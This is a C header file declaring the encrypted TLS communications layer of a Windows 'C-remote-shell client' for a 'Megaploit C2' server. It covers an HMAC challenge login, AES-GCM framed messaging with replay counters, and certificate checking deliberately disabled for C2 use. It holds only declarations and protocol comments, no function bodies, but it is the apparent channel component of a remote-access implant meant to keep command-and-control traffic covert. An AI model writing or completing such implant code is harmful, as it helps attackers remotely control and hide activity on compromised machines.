/*
 * tls_client.h  –  Advanced TLS layer for the C-remote-shell client
 * ==================================================================
 * Matches the Megaploit C2 security standards exactly:
 *
 *  TLS hardening
 *  -------------
 *  • SChannel (Windows native) with SP_PROT_TLS1_2 | SP_PROT_TLS1_3
 *  • AEAD-only cipher suites via SCH_USE_STRONG_CRYPTO flag
 *    (maps to AES-128/256-GCM, ChaCha20-Poly1305 on Win10+)
 *  • SSL 2/3 and TLS 1.0/1.1 explicitly disabled
 *  • No renegotiation (ISC_REQ_NO_RENEGOTIATION where available)
 *  • No null/anonymous/export/RC4 ciphers
 *  • Forward secrecy: ISC_REQ_EXTENDED_ERROR | ISC_REQ_MANUAL_CRED_VALIDATION
 *
 *  Post-TLS auth (mirrors megaploit.core.crypto)
 *  ----------------------------------------------
 *  • Server sends 16-byte random challenge
 *  • Client replies with HMAC-SHA256(secret_key, challenge)  → 32 bytes
 *
 *  Protocol v2 handshake (mirrors megaploit.core.protocol)
 *  --------------------------------------------------------
 *  • Server sends 1 byte: 0x4d ('M') = v2 / AES-256-GCM encrypted
 *  • Client echoes the same byte back to confirm v2
 *
 *  Encrypted framing
 *  -----------------
 *  Every message:  [uint32-BE total_payload_len]
 *                  [12-byte random GCM nonce]
 *                  [ciphertext + 16-byte GCM auth tag]
 *  Plaintext:      [uint64-BE sequence_number][data bytes]
 *
 *  Build requirements
 *  ------------------
 *  Link with: Secur32.lib  Crypt32.lib  ws2_32.lib  bcrypt.lib
 */

#pragma once
#ifndef TLS_CLIENT_H
#define TLS_CLIENT_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>

/* SChannel / SSPI */
#define SECURITY_WIN32
#include <security.h>
#include <schannel.h>
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Crypt32.lib")

/* BCrypt – used for HMAC-SHA256 and AES-256-GCM */
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#ifdef __cplusplus
extern "C" {
#endif


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Constants                                                                  */
/* ─────────────────────────────────────────────────────────────────────────── */

#define TLS_IO_BUFFER_SIZE    (65536)   /* matches C2 BUFFER_SIZE                */
#define TLS_AUTH_HMAC_LEN     (32)      /* HMAC-SHA256 output = 32 bytes         */
#define TLS_CHALLENGE_LEN     (16)      /* server sends a 16-byte challenge      */
#define TLS_NONCE_LEN         (12)      /* AES-GCM nonce = 12 bytes              */
#define TLS_GCM_TAG_LEN       (16)      /* AES-GCM authentication tag = 16 bytes */
#define TLS_SEQ_LEN           (8)       /* uint64-BE sequence number             */
#define TLS_HDR_LEN           (4)       /* uint32-BE frame length prefix         */
#define TLS_V2_MAGIC          (0x4Du)   /* 'M' – v2 encrypted protocol           */

/* Largest single frame we will allocate (256 MiB – mirrors MAX_PLUGIN_MSG_SIZE) */
#define TLS_MAX_FRAME_SIZE    (256 * 1024 * 1024)


/* ─────────────────────────────────────────────────────────────────────────── */
/*  TLS connection context                                                     */
/* ─────────────────────────────────────────────────────────────────────────── */

typedef struct _TLS_CONTEXT {
    SOCKET            sock;             /* underlying Winsock socket            */
    CredHandle        hCred;            /* SChannel credential handle           */
    CtxtHandle        hCtx;             /* SChannel security context            */
    SecPkgContext_StreamSizes streamSz; /* SChannel stream sizes                */
    BOOL              fCtxInit;         /* TRUE once hCtx is valid              */
    BOOL              fCredInit;        /* TRUE once hCred is valid             */

    /* Receive staging buffer (holds raw TLS records not yet decrypted)         */
    BYTE             *pRecvBuf;
    DWORD             cbRecvBuf;        /* bytes currently in pRecvBuf          */
    DWORD             cbRecvBufAlloc;   /* allocated size of pRecvBuf           */

    /* Plaintext leftover between SChannel decrypt calls                        */
    BYTE             *pPlainBuf;
    DWORD             cbPlainBuf;
    DWORD             cbPlainBufAlloc;

    /* AES-256-GCM session key (32 bytes, from shared secret.key)               */
    BYTE              sessionKey[32];

    /* Monotonic send/receive sequence counters (replay protection)             */
    uint64_t          sendSeq;
    uint64_t          recvSeq;          /* -1 before first message              */
} TLS_CONTEXT, *PTLS_CONTEXT;


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Public API                                                                 */
/* ─────────────────────────────────────────────────────────────────────────── */

/*
 * tls_connect
 * -----------
 * Connect to the C2 server over TLS 1.2/1.3 with AEAD-only ciphers,
 * perform HMAC-SHA256 authentication, and negotiate protocol v2.
 *
 * Parameters
 *   pCtx        – caller-allocated TLS_CONTEXT to initialise
 *   sock        – connected (but not yet TLS) Winsock socket
 *   pszHost     – server hostname (SNI and cert check disabled for C2 usage)
 *   pSecretKey  – 32-byte raw shared secret (hex-decoded from secret.key)
 *
 * Returns TRUE on full success, FALSE on any failure.
 */
BOOL tls_connect(PTLS_CONTEXT pCtx, SOCKET sock,
                 const char  *pszHost,
                 const BYTE  *pSecretKey);

/*
 * tls_send_msg
 * ------------
 * Encrypt *cbData* bytes from *pData* with AES-256-GCM, prefix the
 * uint64-BE sequence number, frame with a uint32-BE length header, and
 * send over TLS.
 *
 * Returns TRUE on success.
 */
BOOL tls_send_msg(PTLS_CONTEXT pCtx, const BYTE *pData, DWORD cbData);

/*
 * tls_recv_msg
 * ------------
 * Receive one framed message, decrypt, and verify the sequence number.
 * *ppData is malloc'd by this function; the caller must free() it.
 * *pcbData receives the plaintext byte count (excluding the seq prefix).
 *
 * Returns TRUE on success, FALSE on error or replay.
 */
BOOL tls_recv_msg(PTLS_CONTEXT pCtx, BYTE **ppData, DWORD *pcbData);

/*
 * tls_disconnect
 * --------------
 * Send a TLS close_notify, free all resources.
 */
VOID tls_disconnect(PTLS_CONTEXT pCtx);


#ifdef __cplusplus
}
#endif
#endif /* TLS_CLIENT_H */
